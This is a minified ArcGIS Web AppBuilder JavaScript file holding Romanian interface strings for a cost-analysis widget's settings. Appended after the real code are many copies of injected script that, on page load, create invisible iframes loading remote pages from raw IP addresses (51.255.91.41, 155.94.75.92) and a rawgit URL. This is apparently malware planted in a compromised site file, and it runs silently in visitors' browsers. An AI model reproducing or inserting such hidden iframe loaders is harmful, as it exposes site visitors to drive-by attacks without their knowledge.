// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Stabilire configura\u0163ie text:",generalSettings:{tabTitle:"Set\u0103ri generale",measurementUnitLabel:"Unitate de m\u0103sur\u0103",currencyLabel:"Simbol de m\u0103sur\u0103",roundCostLabel:"Cost rotunjit",projectOutputSettings:"Set\u0103ri rezultate proiect",typeOfProjectAreaLabel:"Tip de domeniu de proiect",bufferDistanceLabel:"Distan\u0163\u0103 buffer",roundCostValues:{twoDecimalPoint:"Dou\u0103 puncte zecimale",nearestWholeNumber:"Cel mai apropiat num\u0103r \u00eentreg",
nearestTen:"Cel mai apropiat num\u0103r de ordinul zecilor",nearestHundred:"Cel mai apropiat num\u0103r de ordinul sutelor",nearestThousand:"Cel mai apropiat num\u0103r de ordinul miilor",nearestTenThousands:"Cel mai apropiat num\u0103r de ordinul zecilor de mii"},projectAreaType:{outline:"Contur",buffer:"Buffer"},errorMessages:{currency:"Unitate monetar\u0103 nevalid\u0103",bufferDistance:"Distan\u0163\u0103 buffer nevalid\u0103",outOfRangebufferDistance:"Valoarea ar trebui s\u0103 fie mai mare de 0 \u0219i mai mic\u0103 sau egal\u0103 cu 100"}},
projectSettings:{tabTitle:"Set\u0103ri proiect",costingGeometrySectionTitle:"Stabilirea caracteristicilor geografice pentru evaluarea costurilor (op\u0163ional)",costingGeometrySectionNote:"Not\u0103: Configurarea acestui strat tematic va permite utilizatorului s\u0103 formuleze ecua\u0163ii de cost pentru \u0219abloanele de obiecte spa\u0163iale \u00een func\u021bie de caracteristicile geografice.",projectTableSectionTitle:"Posibilitatea de a salva/\u00eenc\u0103rca set\u0103rile proiectului (op\u0163ional)",
projectTableSectionNote:"Not\u0103: Configurarea tuturor tabelelor \u0219i straturilor tematice va permite utilizatorului s\u0103 salveze/\u00eencarce proiectul pentru utilizare ulterioar\u0103.",costingGeometryLayerLabel:"Evaluarea geometriei stratului tematic",fieldLabelGeography:"C\u00e2mp pentru etichet\u0103 geometrie",projectAssetsTableLabel:"Tabel active proiect",projectMultiplierTableLabel:"Tabel multiplicator costuri suplimentare proiect",projectLayerLabel:"Strat tematic proiect",configureFieldsLabel:"Configurare c\u00e2mpuri",
fieldDescriptionHeaderTitle:"Descriere c\u00e2mp",layerFieldsHeaderTitle:"C\u00e2mp strat tematic",selectLabel:"Selectare",errorMessages:{duplicateLayerSelection:"${layerName} este deja selectat",invalidConfiguration:"Selecta\u021bi ${fieldsString}"},costingGeometryHelp:"\x3cp\x3eStratul/straturile tematice de tip poligon cu urm\u0103toarele condi\u021bii vor fi afi\u015fate: \x3cbr/\x3e \x3cli\x3e\tStratul tematic trebuie s\u0103 aib\u0103 func\u0163ia \u00e2\u20ac\u0153Query\u00e2\u20ac\u009d\x3c/li\x3e\x3cli\x3e\tStratul tematic trebuie s\u0103 aib\u0103 un c\u00e2mp GlobalID\x3c/li\x3e\x3c/p\x3e",
fieldToLabelGeographyHelp:"\x3cp\x3eStraturile \u0219i c\u00e2mpurile numerice ale c\u00e2mpului selectat \u00e2\u20ac\u0153Costing Geometry Layer\u00e2\u20ac\u009d vor fi afi\u0219ate \u00een lista vertical\u0103 \u00e2\u20ac\u0153Field to Label Geography\u00e2\u20ac\u009d.\x3c/p\x3e",projectAssetsTableHelp:"\x3cp\x3eTabelele cu urm\u0103toarele condi\u021bii vor fi afi\u0219ate: \x3cbr/\x3e \x3cli\x3eTabelul trebuie s\u0103 aib\u0103 func\u0163ii de editare, respectiv \u00e2\u20ac\u0153Create\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Delete\u00e2\u20ac\u009d \u0219i \u00e2\u20ac\u0153Update\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eTabelul trebuie s\u0103 aib\u0103 \u015fase c\u00e2mpuri cu numele exact \u0219i tipul de date:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (GUID type field)\x3c/li\x3e\x3cli\x3e\tCostEquation (String type field)\x3c/li\x3e\x3cli\x3e\tScenario (String type field)\x3c/li\x3e\x3cli\x3e\tTemplateName (String type field)\x3c/li\x3e\x3cli\x3e    GeographyGUID (GUID type field)\x3c/li\x3e\x3cli\x3e\tProjectGUID (GUID type field)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eTabelele cu urm\u0103toarele condi\u021bii vor fi afi\u015fate: \x3cbr/\x3e \x3cli\x3eTabelul trebuie s\u0103 aib\u0103 func\u0163ii de editare, respectiv \u00e2\u20ac\u0153Create\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Delete\u00e2\u20ac\u009d \u0219i \u00e2\u20ac\u0153Update\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eTabelul trebuie s\u0103 aib\u0103 cinci c\u00e2mpuri cu numele exact \u0219i tipul de date:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescriere (String type field)\x3c/li\x3e\x3cli\x3e\tType (String type field)\x3c/li\x3e\x3cli\x3e\tValue (Float/Double type field)\x3c/li\x3e\x3cli\x3e\tCostindex (Integer type field)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (GUID type field))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3eStraturile tematice de tip poligon cu urm\u0103toarele condi\u021bii vor fi afi\u015fate: \x3cbr/\x3e \x3cli\x3eStratul tematic trebuie s\u0103 aib\u0103 func\u0163ii de editare, respectiv \u00e2\u20ac\u0153Create\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Delete\u00e2\u20ac\u009d \u0219i \u00e2\u20ac\u0153Update\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eStratul tematic trebuie s\u0103 aib\u0103 cinci c\u00e2mpuri cu numele exact \u0219i tipul de date:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (String type field)\x3c/li\x3e\x3cli\x3eDescription (String type field)\x3c/li\x3e\x3cli\x3eTotalassetcost (Float/Double type field)\x3c/li\x3e\x3cli\x3eGrossprojectcost (Float/Double type field)\x3c/li\x3e\x3cli\x3eGlobalID (GlobalID type field)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Set\u0103ri strat tematic",layerNameHeaderTitle:"Nume strat tematic",layerNameHeaderTooltip:"Lista straturilor tematice \u00een hart\u0103",EditableLayerHeaderTitle:"Editabil",EditableLayerHeaderTooltip:"Include\u0163i stratul tematic \u0219i \u0219abloanele acestuia \u00een widget-ul de calculare a costurilor",SelectableLayerHeaderTitle:"Selectabil",SelectableLayerHeaderTooltip:"Geometria din stratul tematic poate fi utilizat\u0103 pentru a genera un nou element de cost",
fieldPickerHeaderTitle:"ID Proiect (op\u0163ional)",fieldPickerHeaderTooltip:"C\u00e2mp op\u0163ional (de tip \u015fir) pentru a stoca ID-ul proiectului \u00een",selectLabel:"Selectare",noAssetLayersAvailable:"\u00cen harta web selectat\u0103 nu a fost g\u0103sit niciun activ de strat tematic.",disableEditableCheckboxTooltip:"Acest strat tematic nu are func\u0163ii de editare"},costingInfo:{tabTitle:"Informa\u021bii costuri",proposedMainsLabel:"Elemente principale propuse",addCostingTemplateLabel:"Ad\u0103ugare \u015fablon calculare cost",
manageScenariosTitle:"Gestionare scenarii",featureTemplateTitle:"\u015eablon obiect spa\u0163ial",costEquationTitle:"Ecua\u0163ie costuri",geographyTitle:"Geografie",scenarioTitle:"Scenariu",actionTitle:"Ac\u0163iuni",scenarioNameLabel:"Nume scenariu",addBtnLabel:"Ad\u0103ugare",srNoLabel:"Nu.",deleteLabel:"\u015etergere",duplicateScenarioName:"Duplicare nume scenariu",hintText:"\x3cdiv\x3eSfat: Utiliza\u0163i urm\u0103toarele cuvinte cheie\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: Utilizeaz\u0103 num\u0103rul total de active de acela\u0219i tip dintr-o form\u0103 geografic\u0103\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: Utilizeaz\u0103 lungimea liniei corespunz\u0103toare activului \u0219i suprafe\u0163ei pentru un activ tip poligon poligon\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: Utilizeaz\u0103 lungimea liniei corespunz\u0103toare activului \u0219i suprafe\u0163ei totale pentru un activ tip poligon de acela\u0219i tip dintr-o form\u0103 geografic\u0103\x3c/li\x3e\x3c/ul\x3ePute\u0163i folosi func\u0163ii precum:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eModifica\u0163i ecua\u0163ia costuri conform necesit\u0103\u0163ilor dvs. de proiect.",
noneValue:"Niciunul",requiredCostEquation:"Ecua\u0163ie cost nevalid\u0103 pentru ${layerName} : ${templateName}",duplicateTemplateMessage:"Exist\u0103 o intrare \u015fablon duplicat pentru ${layerName} : ${templateName}",defaultEquationRequired:"Ecua\u0163ia implicit\u0103 este necesar\u0103 pentru ${layerName} : ${templateName}",validCostEquationMessage:"Introduce\u021bi o ecua\u0163ie costuri valid\u0103",costEquationHelpText:"Modifica\u0163i ecua\u0163ia costuri conform necesit\u0103\u0163ilor dvs. de proiect.",
scenarioHelpText:"Selecta\u021bi scenariul conform necesit\u0103\u0163ilor dvs. de proiect.",copyRowTitle:"Copiere r\u00e2nd",noTemplateAvailable:"Ad\u0103uga\u021bi cel pu\u0163in un \u015fablon pentru ${layerName}",manageScenarioLabel:"Gestionare scenariu",noLayerMessage:"Ad\u0103uga\u021bi cel pu\u0163in un strat tematic pentru ${tabName}",noEditableLayersAvailable:"Straturile tematice trebuie s\u0103 fie bifate ca editabile \u00een fila Set\u0103ri strat tematic"},statisticsSettings:{tabTitle:"Set\u0103ri statistici",
addStatisticsLabel:"Ad\u0103ugare statistic\u0103",fieldNameTitle:"C\u00e2mp",statisticsTitle:"Etichet\u0103",addNewStatisticsText:"Ad\u0103ugare statistic\u0103 nou\u0103",deleteStatisticsText:"\u0218tergere statistic\u0103",moveStatisticsUpText:"Mutare statistic\u0103 \u00een sus",moveStatisticsDownText:"Mutare statistic\u0103 \u00een jos",selectDeselectAllTitle:"Selectare toate"},statisticsType:{countLabel:"Num\u0103r",averageLabel:"Medie",maxLabel:"Maxim",minLabel:"Minim",summationLabel:"\u00censumare",
areaLabel:"Suprafa\u0163\u0103",lengthLabel:"Lungime"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});